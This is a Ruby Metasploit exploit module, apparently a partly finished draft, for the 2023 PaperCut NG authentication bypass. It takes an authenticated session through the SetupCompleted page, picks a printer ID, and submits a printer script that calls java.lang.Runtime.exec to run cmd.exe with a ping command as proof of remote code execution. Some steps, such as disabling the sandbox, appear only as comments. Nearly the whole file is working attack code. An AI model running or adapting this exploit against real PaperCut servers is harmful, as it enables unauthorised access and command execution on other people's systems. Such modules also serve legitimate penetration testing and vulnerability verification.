##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'debug'
require 'cgi'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'PaperCut PaperCutNG Authentication Bypass',
        'Description' => %q{
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'catatonicprime' ],
        'References' => [
          [ 'URL', 'https://www.papercut.com/kb/Main/PO-1216-and-PO-1219' ]
        ],
        'Targets' => [ [ 'Automatic Target', {}] ],
        'Platform' => [ 'win', 'linux'],
        'Payload' => {
          'BadChars' => "\x00"
        },
        'Privileged' => true,
        'DisclosureDate' => '2023-03-13',
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => '9192',
          'SSL' => 'True',
          'TARGETURI' => '/app'
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
    register_options(
      [
        OptString.new('TARGETURI', [true, 'Path to the papercut application'])
      ], self.class
    )
  end

  def bypass_auth
    # Hit the SetupCompleted Page & establish an authenticated session.
    # Return success/fail or vuln/not vuln based on response values
    res = send_request_cgi(
      {
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path),
        'keep_cookies' => true,
        'vars_get' => {
          'service' => 'page/SetupCompleted'
        }
      }
    )
    return Exploit::CheckCode::Safe unless res && res.code == 200

    return Exploit::CheckCode::Appears
  end

  def set_server_option
    # set name:value pair(s)
    # 1) do a quickfind (setting the tapestry state)
    # 2) if no property found, add it?
    # 3) else, if necessary, do an update
  end

  def get_printer
    res = send_request_cgi(
      {
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path),
        'keep_cookies' => true,
        'vars_get' => {
          'service' => 'page/PrinterList'
        }
      }
    )
    return Exploit::Failed unless res && res.code == 200

    html = res.get_html_document
    return Exploit::Failed unless html

    printer = html.at('.displayNameColumnValue a')
    return Exploit::Failed unless printer && printer['href']

    uri = URI(normalize_uri(printer['href']))
    return Exploit::Failed unless uri

    params = CGI.parse(uri.query)
    return Exploit::Failed unless params && params['sp']

    return params['sp'][0]
  end

  def check
    # For the check command
    return bypass_auth
  end

  def exploit
    # Main function
    # 1) Bypass the auth using the SetupCompleted page
    bypass_auth
    # 2) Enable scripts, if needed
    # 3) Disable sandboxing, if needed
    # 4) Find a printerId
    printer_id = get_printer
    print_status('Using printerid: ' + printer_id)

    # 5) Select the printer, this loads it into the tapestry session to be modified
    protocol = 'http'
    if datastore['SSL']
      protocol = 'https'
    end
    origin = URI("#{protocol}://#{datastore['RHOST']}:#{datastore['RPORT']}")
    res = send_request_cgi(
      {
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path),
        'keep_cookies' => true,
        'headers' => {
          'Origin' => origin
        },
        'vars_get' => {
          'service' => 'direct/1/PrinterList/selectPrinter',
          'sp' => printer_id
        }
      }
    )
    return Exploit::Failed unless res && res.code == 200

    # 6) Exploit a printer using the printer_id
    res = send_request_cgi(
      {
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path),
        'keep_cookies' => true,
        'headers' => {
          'Origin' => origin
        },
        'vars_post' => {
          'service' => 'direct/1/PrinterDetails/$PrinterDetailsScript.$Form',
          'sp' => 'S0',
          'Form0' => 'printerId,enablePrintScript,scriptBody,$Submit,$Submit$0,$Submit$1',
          'enablePrintScript' => 'on',
          '$Submit$1' => 'Apply',
          'printerId' => printer_id,
          'scriptBody' => %q{
var rt = new java.lang.Runtime.getRuntime();
rt.exec('c:\\\\windows\\\\system32\\\\cmd.exe /c "ping 192.168.1.3"');
s;}
        }
      }
    )
    return Exploit::Failed unless res && res.code == 200
  end
end
